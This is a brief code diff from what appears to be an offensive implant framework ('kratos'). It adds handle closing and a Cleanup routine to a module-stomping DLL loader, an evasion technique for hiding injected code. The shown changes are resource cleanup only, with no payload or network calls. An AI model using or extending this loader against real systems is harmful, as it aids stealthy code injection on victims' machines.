@@ -91,6 +91,9 @@ BOOL Modules::LoadStompedDll() {
 	if ( ! this->CraftModuleStruct( ) ) { return FALSE; }
 	this->IsStompedDllLoaded = TRUE;
 	this->TextSectionIndex = StompedDllText;
+	this->MappedOleBaseAddress = pBase;
+	kratos->apis.CloseHandle(hFile);
+	kratos->apis.CloseHandle(hSection);
 
 	return TRUE;
 
@@ -147,6 +150,24 @@ ModuleInformation* Modules::FindModInfoEntry(INT32 needed) {
 		}
 	}
 	return NULL;
+}
+
+
+void Modules::Cleanup() {
+	if ( this->ModuleStruct ) {
+		kratos->apis.LocalFree( this->ModuleStruct );
+		this->ModuleStruct = NULL;
+	}
+
+	if ( this->MappedOleBaseAddress && kratos->apis.NtUnmapViewOfSection ) {
+		kratos->apis.NtUnmapViewOfSection( GetCurrentProcess( ), this->MappedOleBaseAddress );
+		this->MappedOleBaseAddress = NULL;
+	}
+
+	this->LoadModulesBitMap = 0;
+	Modules* self = this;
+	modules = NULL;
+	kratos->apis.LocalFree( self );
 }
 
 
